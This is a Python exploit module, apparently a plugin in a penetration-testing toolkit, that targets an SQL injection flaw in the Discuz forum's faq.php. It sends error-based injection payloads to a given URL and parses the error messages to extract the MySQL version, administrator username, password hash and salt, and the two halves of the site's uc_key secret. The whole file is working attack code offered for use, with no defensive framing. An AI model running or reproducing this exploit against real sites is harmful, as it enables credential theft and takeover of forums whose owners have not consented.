import re
from typing import Optional

import requests

from lib.log import logger
from plugins.package.payloads import (
    PAYLOAD_DB_VERSION,
    PAYLOAD_GET_USER_PWD_SALT,
    PAYLOAD_GET_KEY1,
    PAYLOAD_GET_KEY2,
)


def get_info(text: str) -> str:
    """Extract information from response text using regex."""
    regex = r"Duplicate entry '(.*?)'"
    items = re.findall(regex, text)
    return items[0] if items else "Can't found..."


def run(url: str) -> Optional[str]:
    """Exploit SQL injection vulnerability in Discuz faq.php."""
    try:
        # Check database version
        logger.info("Checking MySQL version")
        response = requests.get(url + PAYLOAD_DB_VERSION, timeout=5, verify=False)
        logger.success("[+] Discuz faq.php SQL vulnerable ~")
        mysql_version = get_info(response.text)
        logger.info(f"[+] MySQL version: {mysql_version}")

        # Get username, password, and salt
        logger.info("Retrieving username:password:salt")
        response = requests.get(url + PAYLOAD_GET_USER_PWD_SALT, timeout=5, verify=False)
        user_pwd_salt = get_info(response.text)
        logger.info(f"[+] username:password:salt -> {user_pwd_salt}")

        # Get auth key parts
        logger.info("Retrieving auth key part 1")
        response1 = requests.get(url + PAYLOAD_GET_KEY1, timeout=5, verify=False)
        logger.info("Retrieving auth key part 2")
        response2 = requests.get(url + PAYLOAD_GET_KEY2, timeout=5, verify=False)

        uc_key = get_info(response1.text)[2:] + get_info(response2.text)[2:-1]
        logger.success(f"uc_key: {uc_key}")
        return f"uc_key: {uc_key}"
    except requests.RequestException as e:
        logger.error(f"Request failed: {str(e)}")
        return None
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        return None
